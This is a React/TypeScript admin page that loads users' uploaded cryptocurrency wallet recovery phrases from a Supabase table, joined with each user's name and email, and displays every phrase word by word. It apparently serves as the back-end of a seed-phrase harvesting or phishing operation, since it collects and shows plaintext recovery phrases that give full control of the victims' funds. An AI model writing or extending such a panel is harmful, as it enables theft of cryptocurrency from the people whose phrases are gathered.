import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { toast } from "sonner";
import { KeyRound } from "lucide-react";

export default function PhrasesList() {
  const [rows, setRows] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    document.title = "Admin · Wallet Phrases";
    (async () => {
      const { data, error } = await supabase.from("phrases").select("*, profiles(full_name, email)").order("created_at", { ascending: false });
      if (error) toast.error(error.message);
      setRows(data ?? []);
      setLoading(false);
    })();
  }, []);

  return (
    <div className="space-y-4">
      <div>
        <h1 className="text-2xl font-semibold">Wallet Phrases</h1>
        <p className="text-sm text-muted-foreground">{rows.length} phrases · contains highly sensitive data</p>
      </div>
      {loading && <p className="text-muted-foreground">Loading…</p>}
      {!loading && rows.length === 0 && <p className="text-muted-foreground">No phrases uploaded</p>}
      <div className="grid gap-4 md:grid-cols-2">
        {rows.map((p) => {
          const words = (p.phrase || "").trim().split(/\s+/);
          return (
            <Card key={p.id}>
              <CardHeader className="pb-2">
                <CardTitle className="flex items-center gap-2 text-base">
                  <KeyRound className="h-4 w-4" />
                  {p.wallet_name || "Wallet"}
                </CardTitle>
                <p className="text-xs text-muted-foreground">{p.profiles?.full_name || p.profiles?.email || "—"} · {new Date(p.created_at).toLocaleDateString()}</p>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-3 gap-2 font-mono text-sm">
                  {words.map((w: string, i: number) => (
                    <div key={i} className="rounded border border-border bg-muted/30 px-2 py-1">
                      <span className="mr-1 text-xs text-muted-foreground">{i + 1}.</span>{w}
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          );
        })}
      </div>
    </div>
  );
}
